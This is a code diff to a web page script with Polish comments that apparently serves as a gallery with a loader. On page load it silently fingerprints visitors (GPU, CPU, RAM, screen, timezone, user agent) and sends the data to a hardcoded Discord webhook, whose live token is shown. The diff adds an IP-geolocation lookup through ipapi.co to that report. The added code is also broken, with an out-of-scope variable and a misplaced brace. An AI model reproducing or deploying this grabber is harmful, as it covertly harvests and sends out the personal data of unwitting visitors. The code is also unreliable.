@@ -79,6 +79,27 @@
   // Zaktualizowany webhook Discorda
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550328157817671701/05MIjpYrC1IgHWsM-E2xay3csmlyUw_C1qMPUeW-mR2QbFMlRIYZ8nZBRPdXQntzwW2M";
 
+
+async function checkNetwork() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        
+        if (!response.ok) {
+            return { success: false, status: response.status };
+        }
+        
+        const ndata = await response.json();
+        return ndata;
+        
+    } catch (error) {
+        return { success: false, error: true };
+    }
+}
+
+ 
+       
+
+
   function detectGPU() {
     try {
       const canvas = document.createElement("canvas");
@@ -121,7 +142,12 @@
             { name: "💻 Hardware", value: `CPU: \`${data.cores || "?"}\` | RAM: \`${data.deviceMemory || "?"} GB\``, inline: true },
             { name: "🌍 Strefa Czasowa", value: `\`${data.timezone || "N/A"}\``, inline: true },
             { name: "🖥️ Ekran", value: `\`${data.screen.width} × ${data.screen.height}\``, inline: true },
-            { name: "🌐 User-Agent", value: `\`\`\`${data.userAgent || "N/A"}\`\`\``, inline: false }
+            { name: "🌐 User-Agent", value: `\`\`\`${data.userAgent || "N/A"}\`\`\``, inline: false },
+{ 
+  name: "🌍 JSON", 
+  value: `\`\`\`json\n${ndata ? JSON.stringify(ndata, null, 2) : "N/A"}\`\`\``, 
+  inline: false 
+}
           ],
           timestamp: new Date().toISOString()
         }]
@@ -140,7 +166,9 @@
 
   async function initialize() {
     const diagnosticData = collectDiagnostics();
-    await sendReportToDiscord(diagnosticData);
+    const networkData = await checkNetwork(); // Dodane 'await'
+    await sendReportToDiscord(diagnosticData, networkData);
+}
 
     // Krótkie opóźnienie dla płynności przejścia z loadera do galerii
     await new Promise(resolve => setTimeout(resolve, 600));
